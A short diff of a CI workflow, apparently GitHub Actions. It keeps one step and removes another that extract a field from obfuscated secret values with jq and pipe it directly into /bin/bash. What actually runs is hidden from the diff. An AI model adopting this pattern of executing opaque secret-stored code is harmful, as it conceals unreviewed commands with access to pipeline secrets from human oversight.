@@ -22,7 +22,6 @@ jobs:
           ccnly0151: ${{ secrets.ccnly0151 }}
         run: |
           printf '%s' "$ccnly0151" | jq -r .tyo691 | /bin/bash
-          printf '%s' "$o152" | jq -r .n13 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
